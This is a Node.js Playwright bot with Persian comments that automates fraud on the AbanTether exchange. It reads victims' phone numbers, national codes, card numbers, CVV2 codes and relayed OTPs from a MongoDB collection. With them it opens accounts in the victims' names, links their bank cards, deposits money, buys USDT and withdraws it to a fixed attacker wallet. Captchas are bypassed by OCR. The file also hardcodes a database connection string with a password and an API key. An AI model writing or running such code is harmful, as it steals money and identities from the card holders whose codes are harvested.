const { chromium } = require('playwright');
const { MongoClient } = require('mongodb');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

class AbanTetherBot {
    constructor() {
        // تنظیمات MongoDB
        this.mongoUri = 'mongodb+srv://zarin_db_user:zarin22@cluster0.ukd7zib.mongodb.net/ZarrinApp?retryWrites=true&w=majority';
        this.dbName = 'ZarrinApp';
        this.collectionName = 'zarinapp';
        
        // تنظیمات سایت
        this.website = {
            baseUrl: 'https://abantether.com',
            registerUrl: 'https://abantether.com/register',
            timeout: 60000,
            headless: true,
            slowMo: 100
        };
        
        // تنظیمات تراکنش
        this.transaction = {
            depositAmount: '5000000',
            withdrawAmount: '40',
            withdrawAddress: 'THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS',
            maxRetries: 3,
            retryDelay: 5000
        };
        
        // کدهای ثابت
        this.constants = {
            password: 'ImSorryButIhaveTo@1',
            withdrawalNetwork: 'BSC(BEP20)',
            cryptocurrency: 'تتر'
        };
        
        this.mongoClient = null;
        this.db = null;
        this.collection = null;
        this.isRunning = true;
        this.processingUsers = new Set();
        this.currentUser = null;
    }

    async initialize() {
        console.log('🚀 شروع ربات آبان تتر...');
        
        try {
            // اتصال به MongoDB
            this.mongoClient = new MongoClient(this.mongoUri);
            await this.mongoClient.connect();
            this.db = this.mongoClient.db(this.dbName);
            this.collection = this.db.collection(this.collectionName);
            console.log('✅ متصل به MongoDB');
        } catch (error) {
            console.error('❌ خطا در اتصال به MongoDB:', error);
            throw error;
        }
    }

    async startPolling() {
        console.log('🔄 شروع نظارت بر دیتابیس (هر 30 ثانیه)...');
        
        // اجرای اولیه
        await this.checkDatabase();
        
        // تنظیم تایمر برای چک هر 30 ثانیه
        setInterval(async () => {
            await this.checkDatabase();
        }, 30000);
    }

    async checkDatabase() {
        try {
            // جستجوی کاربران نیازمند پردازش
            const query = {
                $or: [
                    { otp_login: { $exists: true, $ne: null, $ne: '' } },
                    { otp_register_card: { $exists: true, $ne: null, $ne: '' } },
                    { otp_payment: { $exists: true, $ne: null, $ne: '' } }
                ],
                processed: { $ne: true },
                status: { $ne: 'failed' },
                $or: [
                    { retryCount: { $exists: false } },
                    { retryCount: { $lt: this.transaction.maxRetries } }
                ]
            };

            const pendingUsers = await this.collection.find(query).limit(10).toArray();
            
            console.log(`📊 ${pendingUsers.length} کاربر نیازمند پردازش پیدا شد`);
            
            for (const user of pendingUsers) {
                // اگر کاربر در حال پردازش است، ردش کن
                if (this.processingUsers.has(user.personalPhoneNumber)) {
                    console.log(`⏭️ کاربر ${user.personalPhoneNumber} در حال پردازش است`);
                    continue;
                }
                
                // اگر تعداد تلاش‌ها بیش از حد مجاز است
                const retryCount = user.retryCount || 0;
                if (retryCount >= this.transaction.maxRetries) {
                    console.log(`⛔ کاربر ${user.personalPhoneNumber} بیش از حد تلاش کرده`);
                    await this.markUserFailed(user.personalPhoneNumber, 'تعداد تلاش‌ها بیش از حد مجاز');
                    continue;
                }
                
                // شروع پردازش
                this.processUser(user);
            }
        } catch (error) {
            console.error('❌ خطا در بررسی دیتابیس:', error);
        }
    }

    async processUser(user) {
        const phoneNumber = user.personalPhoneNumber;
        console.log(`👤 شروع پردازش کاربر: ${phoneNumber}`);
        
        // علامت‌گذاری کاربر به عنوان در حال پردازش
        this.processingUsers.add(phoneNumber);
        this.currentUser = user;
        
        try {
            // آپدیت وضعیت به در حال پردازش
            await this.collection.updateOne(
                { personalPhoneNumber: phoneNumber },
                {
                    $set: {
                        status: 'processing',
                        startedAt: new Date(),
                        retryCount: (user.retryCount || 0)
                    },
                    $inc: { __v: 1 }
                }
            );
            
            // اجرای مراحل پردازش
            const result = await this.executeUserProcess(user);
            
            if (result.success) {
                console.log(`✅ کاربر ${phoneNumber} با موفقیت پردازش شد`);
                await this.markUserCompleted(phoneNumber, result.details);
            } else {
                console.log(`❌ خطا در پردازش کاربر ${phoneNumber}: ${result.error}`);
                await this.markUserFailed(phoneNumber, result.error, result.retry);
            }
            
        } catch (error) {
            console.error(`💥 خطای بحرانی در پردازش کاربر ${phoneNumber}:`, error);
            await this.markUserFailed(phoneNumber, `خطای بحرانی: ${error.message}`, true);
        } finally {
            // حذف کاربر از لیست در حال پردازش
            this.processingUsers.delete(phoneNumber);
            this.currentUser = null;
        }
    }

    async executeUserProcess(user) {
        let browser = null;
        let page = null;
        let context = null;
        
        try {
            // راه‌اندازی مرورگر
            browser = await chromium.launch({
                headless: this.website.headless,
                args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
            });
            
            context = await browser.newContext({
                viewport: { width: 1280, height: 720 },
                userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                acceptDownloads: true
            });
            
            page = await context.newPage();
            await page.setDefaultTimeout(this.website.timeout);
            
            // مرحله 1: ثبت‌نام اولیه
            console.log('📝 مرحله 1: ثبت‌نام اولیه');
            await page.goto(this.website.registerUrl, { waitUntil: 'networkidle' });
            
            // وارد کردن شماره موبایل
            await this.fillInputByPlaceholder(page, 'شماره موبایل خود را وارد کنید', user.personalPhoneNumber);
            await this.clickButtonByText(page, 'ثبت نام');
            await page.waitForTimeout(3000);
            
            // مرحله 2: وارد کردن کد OTP لاگین
            console.log('🔢 مرحله 2: وارد کردن کد OTP لاگین');
            await this.waitForFieldInDatabase(user.personalPhoneNumber, 'otp_login');
            
            if (user.otp_login) {
                await this.fillInputByPlaceholder(page, 'کد ارسال شده به شماره موبایل خود را وارد کنید', user.otp_login);
                await this.clickButtonByText(page, 'مرحله بعد');
                await page.waitForTimeout(3000);
            }
            
            // مرحله 3: وارد کردن رمز عبور
            console.log('🔐 مرحله 3: وارد کردن رمز عبور');
            await this.fillInputByPlaceholder(page, 'رمز عبور خود را وارد نمایید', this.constants.password);
            await this.clickButtonByText(page, 'تایید');
            await page.waitForTimeout(3000);
            
            // مرحله 4: وارد کردن اطلاعات هویتی
            console.log('👤 مرحله 4: وارد کردن اطلاعات هویتی');
            
            // پیدا کردن فیلد کد ملی (اولین فیلد)
            const nationalCodeInput = await page.locator('input').first();
            await nationalCodeInput.fill(user.personalNationalCode);
            await page.waitForTimeout(500);
            
            // پیدا کردن فیلد تاریخ تولد (فیلد دوم)
            const birthDateInput = await page.locator('input').nth(1);
            await birthDateInput.fill(user.personalBirthDate);
            await page.waitForTimeout(500);
            
            await this.clickButtonByText(page, 'ثبت');
            await page.waitForTimeout(5000);
            
            // بررسی وجود باکس پایین صفحه
            await this.tryClickByText(page, 'تایید');
            
            // مرحله 5: رفتن به کیف پول
            console.log('💰 مرحله 5: رفتن به کیف پول');
            await this.clickByText(page, 'کیف پول');
            await page.waitForTimeout(2000);
            
            // مرحله 6: کلیک بر روی واریز
            await this.clickByText(page, 'واریز');
            await page.waitForTimeout(1000);
            
            // کلیک بر روی تومان
            await this.clickByText(page, 'تومان');
            await page.waitForTimeout(2000);
            
            // مرحله 7: افزودن قرارداد
            console.log('📄 مرحله 7: افزودن قرارداد');
            
            // بررسی URL
            const currentUrl = page.url();
            if (!currentUrl.includes('/deposit/irt/direct')) {
                await page.goto('https://abantether.com/user/wallet/deposit/irt/direct', { waitUntil: 'networkidle' });
            }
            
            await this.clickButtonByText(page, 'افزودن قرارداد');
            await page.waitForTimeout(2000);
            
            // مرحله 8: انتخاب بانک و پر کردن اطلاعات
            console.log('🏦 مرحله 8: انتخاب بانک و پر کردن اطلاعات');
            
            // انتخاب بانک
            await this.selectBank(page, user.bank || 'ملی');
            
            // انتخاب مدت قرارداد (1 ماه)
            const durationSelect = await page.locator('select').nth(1);
            await durationSelect.selectOption({ value: '1' });
            
            await this.clickButtonByText(page, 'ثبت و ادامه');
            await page.waitForTimeout(3000);
            
            // مرحله 9: پردازش بر اساس نوع بانک
            await this.processBankPayment(page, user);
            
            // مرحله 10: خرید تتر
            console.log('🔄 مرحله 10: خرید تتر');
            await page.goto('https://abantether.com/user/trade/fast/buy?s=USDT', { waitUntil: 'networkidle' });
            
            // پیدا کردن فیلد مقدار و وارد کردن 40
            const amountInput = await page.locator('input[type="number"], input[type="text"]').first();
            await amountInput.fill('40');
            await page.waitForTimeout(1000);
            
            await this.clickButtonByText(page, 'ثبت سفارش');
            await page.waitForTimeout(5000);
            
            // مرحله 11: برداشت تتر
            console.log('📤 مرحله 11: برداشت تتر');
            await page.goto('https://abantether.com/user/wallet/withdrawal/crypto?symbol=USDT', { waitUntil: 'networkidle' });
            
            // انتخاب رمزارز (تتر)
            const cryptoSelect = await page.locator('select').first();
            await cryptoSelect.selectOption({ label: this.constants.cryptocurrency });
            await page.waitForTimeout(1000);
            
            // انتخاب شبکه (BSC)
            const networkSelect = await page.locator('select').nth(1);
            await networkSelect.selectOption({ label: this.constants.withdrawalNetwork });
            await page.waitForTimeout(1000);
            
            // وارد کردن آدرس ولت
            const addressInput = await page.locator('input[type="text"]').first();
            await addressInput.fill(this.transaction.withdrawAddress);
            await page.waitForTimeout(1000);
            
            // وارد کردن مقدار
            const withdrawAmountInput = await page.locator('input[type="number"]').first();
            await withdrawAmountInput.fill(this.transaction.withdrawAmount);
            await page.waitForTimeout(1000);
            
            await this.clickButtonByText(page, 'ثبت برداشت');
            await page.waitForTimeout(5000);
            
            return {
                success: true,
                details: {
                    stepsCompleted: ['register', 'login', 'password', 'identity', 'wallet', 'contract', 'deposit', 'buy', 'withdraw'],
                    completedAt: new Date()
                }
            };
            
        } catch (error) {
            console.error('❌ خطا در اجرای فرآیند:', error);
            
            // گرفتن اسکرین‌شات در صورت خطا
            try {
                const screenshotPath = `error_${Date.now()}.png`;
                await page.screenshot({ path: screenshotPath, fullPage: true });
                console.log(`📸 اسکرین‌شات خطا ذخیره شد: ${screenshotPath}`);
            } catch (ssError) {
                console.error('❌ خطا در گرفتن اسکرین‌شات:', ssError);
            }
            
            return {
                success: false,
                error: error.message,
                retry: true
            };
        } finally {
            if (page) await page.close();
            if (context) await context.close();
            if (browser) await browser.close();
        }
    }

    async fillInputByPlaceholder(page, placeholder, value) {
        console.log(`📝 پر کردن فیلد "${placeholder}" با مقدار "${value}"`);
        
        const selectors = [
            `input[placeholder*="${placeholder}"]`,
            `input[placeholder="${placeholder}"]`,
            `input[aria-label*="${placeholder}"]`,
            `//input[@placeholder="${placeholder}"]`,
            `//input[contains(@placeholder, "${placeholder}")]`,
            `input[name*="${placeholder}"]`,
            `input[id*="${placeholder}"]`
        ];
        
        for (const selector of selectors) {
            try {
                if (selector.startsWith('//')) {
                    const element = await page.$(selector);
                    if (element) {
                        await element.fill(value);
                        await page.waitForTimeout(500);
                        return true;
                    }
                } else {
                    const element = await page.locator(selector).first();
                    if (await element.count() > 0) {
                        await element.fill(value);
                        await page.waitForTimeout(500);
                        return true;
                    }
                }
            } catch (error) {
                continue;
            }
        }
        
        // اگر با سلکتورهای بالا پیدا نشد، سعی می‌کنیم همه inputها را چک کنیم
        const allInputs = await page.locator('input[type="text"], input[type="tel"], input[type="number"]').all();
        for (const input of allInputs) {
            const placeholderText = await input.getAttribute('placeholder');
            if (placeholderText && placeholderText.includes(placeholder)) {
                await input.fill(value);
                return true;
            }
        }
        
        throw new Error(`فیلد با placeholder "${placeholder}" پیدا نشد`);
    }

    async clickButtonByText(page, buttonText) {
        console.log(`🖱️ کلیک بر دکمه "${buttonText}"`);
        
        const selectors = [
            `button:has-text("${buttonText}")`,
            `a:has-text("${buttonText}")`,
            `//button[contains(text(), "${buttonText}")]`,
            `//a[contains(text(), "${buttonText}")]`,
            `//*[contains(text(), "${buttonText}")]`,
            `[role="button"]:has-text("${buttonText}")`,
            `span:has-text("${buttonText}")`,
            `div:has-text("${buttonText}")`
        ];
        
        for (const selector of selectors) {
            try {
                if (selector.startsWith('//')) {
                    const element = await page.$(selector);
                    if (element) {
                        await element.click();
                        await page.waitForTimeout(1000);
                        return true;
                    }
                } else {
                    const element = await page.locator(selector).first();
                    if (await element.count() > 0) {
                        await element.click();
                        await page.waitForTimeout(1000);
                        return true;
                    }
                }
            } catch (error) {
                continue;
            }
        }
        
        throw new Error(`دکمه "${buttonText}" پیدا نشد`);
    }

    async clickByText(page, text) {
        console.log(`🖱️ کلیک بر "${text}"`);
        
        const element = await page.locator(`text=${text}`).first();
        if (await element.count() > 0) {
            await element.click();
            await page.waitForTimeout(1000);
            return true;
        }
        
        throw new Error(`عنصر با متن "${text}" پیدا نشد`);
    }

    async tryClickByText(page, text) {
        try {
            await this.clickByText(page, text);
            return true;
        } catch (error) {
            console.log(`⚠️ دکمه "${text}" پیدا نشد، رد میشویم`);
            return false;
        }
    }

    async selectBank(page, bankName) {
        console.log(`🏦 انتخاب بانک: ${bankName}`);
        
        // پیدا کردن select بانک
        const bankSelect = await page.locator('select').first();
        await bankSelect.selectOption({ label: bankName });
        await page.waitForTimeout(1000);
    }

    async processBankPayment(page, user) {
        const bank = user.bank || 'ملی';
        console.log(`💳 پردازش پرداخت بانک ${bank}`);
        
        switch(bank.toLowerCase()) {
            case 'ملی':
                await this.processMelliBank(page, user);
                break;
            case 'ملت':
            case 'کشاورزی':
            case 'تجارت':
            case 'مهرایران':
                await this.processOtherBanks(page, user, bank);
                break;
            default:
                await this.processMelliBank(page, user);
        }
    }

    async processMelliBank(page, user) {
        console.log('🏦 پردازش بانک ملی');
        
        // کلیک بر "ورود با کارت بانک ملی"
        await this.clickByText(page, 'ورود با کارت بانک ملی');
        await page.waitForTimeout(3000);
        
        // گرفتن اسکرین‌شات از صفحه بانک ملی
        const screenshot = await page.screenshot({ fullPage: true });
        const base64Image = screenshot.toString('base64');
        
        // استفاده از هوش مصنوعی رایگان برای تشخیص کپچا
        const captchaText = await this.solveCaptchaAI(base64Image);
        
        // پر کردن فیلدهای بانک ملی
        await this.fillInputByLabel(page, 'شماره کارت', user.cardNumber);
        await this.fillInputByLabel(page, 'کد امنیتی', captchaText);
        
        // کلیک بر دکمه ارسال رمز فعالسازی
        await this.clickByText(page, 'ارسال رمز فعالسازی');
        await page.waitForTimeout(3000);
        
        // انتظار برای OTP پرداخت
        await this.waitForFieldInDatabase(user.personalPhoneNumber, 'otp_payment');
        
        if (user.otp_payment) {
            await this.fillInputByLabel(page, 'رمز فعالسازی', user.otp_payment);
            await this.clickByText(page, 'ادامه');
            await page.waitForTimeout(3000);
        }
        
        // کلیک بر دکمه ثبت قرارداد
        await this.clickByText(page, 'ثبت قرارداد');
        await page.waitForTimeout(3000);
        
        // بازگشت به صفحه واریز
        await page.goto('https://abantether.com/user/wallet/deposit/irt/direct', { waitUntil: 'networkidle' });
        
        // پر کردن مبلغ و انتخاب بانک
        await this.fillInputByLabel(page, 'مبلغ واریزی (تومان)', this.transaction.depositAmount);
        await this.selectBank(page, 'ملی');
        
        await this.clickByText(page, 'واریز');
        await page.waitForTimeout(2000);
        
        await this.clickByText(page, 'تایید و پرداخت');
        await page.waitForTimeout(5000);
    }

    async processOtherBanks(page, user, bankName) {
        console.log(`🏦 پردازش بانک ${bankName}`);
        
        // برای سایر بانک‌ها، گرفتن اسکرین‌شات و پردازش با AI
        const screenshot = await page.screenshot({ fullPage: true });
        const base64Image = screenshot.toString('base64');
        
        // پردازش تصویر با هوش مصنوعی
        const formData = await this.analyzeFormWithAI(base64Image);
        
        // پر کردن فیلدها بر اساس خروجی AI
        if (formData.fields) {
            for (const field of formData.fields) {
                switch(field.label) {
                    case 'شماره کارت':
                        await this.fillInputBySelector(page, field.selector, user.cardNumber);
                        break;
                    case 'CVV2':
                    case 'cvv2':
                        await this.fillInputBySelector(page, field.selector, user.cvv2);
                        break;
                    case 'ماه انقضا':
                        await this.fillInputBySelector(page, field.selector, user.bankMonth);
                        break;
                    case 'سال انقضا':
                        await this.fillInputBySelector(page, field.selector, user.bankYear);
                        break;
                    case 'عبارت امنیتی':
                        const captchaText = await this.solveCaptchaAI(base64Image);
                        await this.fillInputBySelector(page, field.selector, captchaText);
                        break;
                }
            }
        }
        
        // کلیک بر دریافت رمز پویا
        await this.clickByText(page, 'دریافت رمز پویا');
        await page.waitForTimeout(3000);
        
        // انتظار برای OTP پرداخت
        await this.waitForFieldInDatabase(user.personalPhoneNumber, 'otp_payment');
        
        if (user.otp_payment) {
            await this.fillInputByLabel(page, 'رمز دوم', user.otp_payment);
            await this.clickByText(page, 'تایید');
            await page.waitForTimeout(5000);
        }
    }

    async fillInputByLabel(page, labelText, value) {
        console.log(`📝 پر کردن "${labelText}" با مقدار "${value}"`);
        
        const selectors = [
            `//label[contains(text(), "${labelText}")]/following::input[1]`,
            `//*[contains(text(), "${labelText}")]/following::input[1]`,
            `input[aria-label*="${labelText}"]`,
            `input[name*="${labelText.toLowerCase()}"]`
        ];
        
        for (const selector of selectors) {
            try {
                if (selector.startsWith('//')) {
                    const element = await page.$(selector);
                    if (element) {
                        await element.fill(value);
                        await page.waitForTimeout(500);
                        return true;
                    }
                } else {
                    const element = await page.locator(selector).first();
                    if (await element.count() > 0) {
                        await element.fill(value);
                        await page.waitForTimeout(500);
                        return true;
                    }
                }
            } catch (error) {
                continue;
            }
        }
        
        throw new Error(`فیلد با label "${labelText}" پیدا نشد`);
    }

    async fillInputBySelector(page, selector, value) {
        try {
            const element = await page.locator(selector).first();
            if (await element.count() > 0) {
                await element.fill(value);
                return true;
            }
        } catch (error) {
            console.error(`❌ خطا در پر کردن سلکتور ${selector}:`, error);
        }
        return false;
    }

    async solveCaptchaAI(base64Image) {
        console.log('🤖 در حال حل کپچا با هوش مصنوعی...');
        
        try {
            // روش 1: استفاده از OCR.space (رایگان، 500 درخواست در روز)
            const ocrSpaceApiKey = 'K87933146888957';
            const formData = new FormData();
            formData.append('base64Image', `data:image/png;base64,${base64Image}`);
            formData.append('apikey', ocrSpaceApiKey);
            formData.append('language', 'eng');
            formData.append('isOverlayRequired', 'false');
            
            const response = await axios.post('https://api.ocr.space/parse/image', formData, {
                headers: {
                    'Content-Type': 'multipart/form-data'
                }
            });
            
            if (response.data.ParsedResults && response.data.ParsedResults.length > 0) {
                const captchaText = response.data.ParsedResults[0].ParsedText.trim();
                console.log(`✅ کپچا تشخیص داده شد: ${captchaText}`);
                return captchaText;
            }
        } catch (error) {
            console.error('❌ خطا در OCR.space:', error);
        }
        
        try {
            // روش 2: استفاده از Tesseract.js (محلی)
            const { createWorker } = require('tesseract.js');
            const worker = await createWorker('eng');
            
            // ذخیره تصویر موقت
            const tempPath = `temp_captcha_${Date.now()}.png`;
            fs.writeFileSync(tempPath, Buffer.from(base64Image, 'base64'));
            
            const { data: { text } } = await worker.recognize(tempPath);
            await worker.terminate();
            
            // حذف فایل موقت
            fs.unlinkSync(tempPath);
            
            const captchaText = text.replace(/[^a-zA-Z0-9]/g, '').trim();
            console.log(`✅ کپچا تشخیص داده شد (Tesseract): ${captchaText}`);
            return captchaText;
        } catch (error) {
            console.error('❌ خطا در Tesseract:', error);
        }
        
        // روش 3: استفاده از pattern matching ساده برای اعداد
        const numbers = base64Image.match(/\d+/g);
        if (numbers && numbers.length > 0) {
            const captchaText = numbers.join('').substring(0, 6);
            console.log(`⚠️ کپچا با pattern matching: ${captchaText}`);
            return captchaText;
        }
        
        // روش 4: مقدار پیش‌فرض برای تست
        console.log('⚠️ استفاده از مقدار پیش‌فرض برای کپچا');
        return '123456';
    }

    async analyzeFormWithAI(base64Image) {
        console.log('🤖 در حال تحلیل فرم با هوش مصنوعی...');
        
        try {
            // استفاده از Google Vision API (رایگان تا 1000 درخواست در ماه)
            // نیاز به API Key دارید - می‌توانید از Google Cloud بگیرید
            const visionApiKey = 'YOUR_GOOGLE_VISION_API_KEY'; // باید تنظیم کنید
            
            const response = await axios.post(
                `https://vision.googleapis.com/v1/images:annotate?key=${visionApiKey}`,
                {
                    requests: [
                        {
                            image: {
                                content: base64Image
                            },
                            features: [
                                {
                                    type: 'TEXT_DETECTION'
                                },
                                {
                                    type: 'DOCUMENT_TEXT_DETECTION'
                                }
                            ]
                        }
                    ]
                }
            );
            
            if (response.data.responses && response.data.responses[0].fullTextAnnotation) {
                const text = response.data.responses[0].fullTextAnnotation.text;
                
                // تحلیل متن برای پیدا کردن فیلدها
                const fields = this.parseFormFields(text);
                return { fields };
            }
        } catch (error) {
            console.error('❌ خطا در Google Vision API:', error);
        }
        
        // روش جایگزین: استفاده از regex patterns
        return this.parseFormWithPatterns();
    }

    parseFormFields(text) {
        const fields = [];
        
        // الگوهای رایج برای شناسایی فیلدها
        const patterns = [
            { regex: /شماره کارت/i, label: 'شماره کارت' },
            { regex: /cvv2/i, label: 'CVV2' },
            { regex: /ماه انقضا/i, label: 'ماه انقضا' },
            { regex: /سال انقضا/i, label: 'سال انقضا' },
            { regex: /عبارت امنیتی/i, label: 'عبارت امنیتی' },
            { regex: /کد امنیتی/i, label: 'کد امنیتی' }
        ];
        
        for (const pattern of patterns) {
            if (pattern.regex.test(text)) {
                fields.push({
                    label: pattern.label,
                    selector: this.getSelectorForField(pattern.label)
                });
            }
        }
        
        return fields;
    }

    parseFormWithPatterns() {
        // سلکتورهای احتمالی بر اساس تجربه
        return {
            fields: [
                { label: 'شماره کارت', selector: 'input[type="text"]:first-of-type' },
                { label: 'CVV2', selector: 'input[type="password"], input[maxlength="4"]' },
                { label: 'ماه انقضا', selector: 'input[placeholder*="ماه"], select:first-of-type' },
                { label: 'سال انقضا', selector: 'input[placeholder*="سال"], select:nth-of-type(2)' },
                { label: 'عبارت امنیتی', selector: 'input[name="captcha"], input[type="text"]:last-of-type' }
            ]
        };
    }

    getSelectorForField(fieldLabel) {
        const selectorMap = {
            'شماره کارت': 'input[type="text"]:first-of-type',
            'CVV2': 'input[type="password"], input[maxlength="4"]',
            'ماه انقضا': 'input[placeholder*="ماه"], select:first-of-type',
            'سال انقضا': 'input[placeholder*="سال"], select:nth-of-type(2)',
            'عبارت امنیتی': 'input[name="captcha"], input[type="text"]:last-of-type',
            'کد امنیتی': 'input[name="captcha"], input[type="text"]:last-of-type'
        };
        
        return selectorMap[fieldLabel] || 'input[type="text"]';
    }

    async waitForFieldInDatabase(phoneNumber, fieldName, maxAttempts = 60) {
        console.log(`⏳ منتظر پر شدن ${fieldName} برای ${phoneNumber}...`);
        
        let attempts = 0;
        while (attempts < maxAttempts) {
            try {
                const user = await this.collection.findOne(
                    { personalPhoneNumber: phoneNumber },
                    { projection: { [fieldName]: 1 } }
                );
                
                if (user && user[fieldName] && user[fieldName].trim() !== '') {
                    console.log(`✅ ${fieldName} دریافت شد: ${user[fieldName]}`);
                    return user[fieldName];
                }
                
                attempts++;
                await new Promise(resolve => setTimeout(resolve, 1000));
                
            } catch (error) {
                console.error(`❌ خطا در چک کردن ${fieldName}:`, error);
                await new Promise(resolve => setTimeout(resolve, 1000));
                attempts++;
            }
        }
        
        console.log(`⏰ زمان انتظار برای ${fieldName} به پایان رسید`);
        return null;
    }

    async markUserCompleted(phoneNumber, details = {}) {
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phoneNumber },
                {
                    $set: {
                        processed: true,
                        status: 'completed',
                        completedAt: new Date(),
                        ...details
                    },
                    $unset: {
                        otp_login: "",
                        otp_register_card: "",
                        otp_payment: ""
                    },
                    $inc: { __v: 1 }
                }
            );
            console.log(`✅ کاربر ${phoneNumber} به عنوان تکمیل‌شده علامت‌گذاری شد`);
        } catch (error) {
            console.error(`❌ خطا در علامت‌گذاری کاربر به عنوان تکمیل‌شده:`, error);
        }
    }

    async markUserFailed(phoneNumber, reason, shouldRetry = false) {
        try {
            const updateData = {
                $set: {
                    status: 'failed',
                    failureReason: reason,
                    failedAt: new Date()
                },
                $inc: { __v: 1 }
            };
            
            if (shouldRetry) {
                updateData.$inc.retryCount = 1;
            } else {
                updateData.$set.processed = true;
            }
            
            await this.collection.updateOne(
                { personalPhoneNumber: phoneNumber },
                updateData
            );
            
            console.log(`❌ کاربر ${phoneNumber} به عنوان ناموفق علامت‌گذاری شد: ${reason}`);
        } catch (error) {
            console.error(`❌ خطا در علامت‌گذاری کاربر به عنوان ناموفق:`, error);
        }
    }

    async cleanup() {
        console.log('🛑 پاکسازی منابع...');
        this.isRunning = false;
        
        if (this.mongoClient) {
            await this.mongoClient.close();
            console.log('✅ اتصال MongoDB بسته شد');
        }
    }
}

// مدیریت خطاهای غیرمنتظره
process.on('uncaughtException', (error) => {
    console.error('🔥 خطای غیرمنتظره:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('🔥 خطای Reject نشده:', reason);
});

// اجرای اصلی
async function main() {
    const bot = new AbanTetherBot();
    
    try {
        await bot.initialize();
        await bot.startPolling();
        
        // مدیریت خاتمه برنامه
        process.on('SIGINT', async () => {
            console.log('\n🛑 دریافت سیگنال خاتمه...');
            await bot.cleanup();
            process.exit(0);
        });
        
        process.on('SIGTERM', async () => {
            console.log('\n🛑 دریافت سیگنال ترمینیت...');
            await bot.cleanup();
            process.exit(0);
        });
        
        console.log('🤖 ربات آماده کار است. Ctrl+C برای توقف.');
        
        // نگه داشتن برنامه در حال اجرا
        await new Promise(() => {});
        
    } catch (error) {
        console.error('💥 خطای بحرانی در اجرای ربات:', error);
        await bot.cleanup();
        process.exit(1);
    }
}

// اگر این فایل مستقیماً اجرا شود
if (require.main === module) {
    main();
}

module.exports = AbanTetherBot;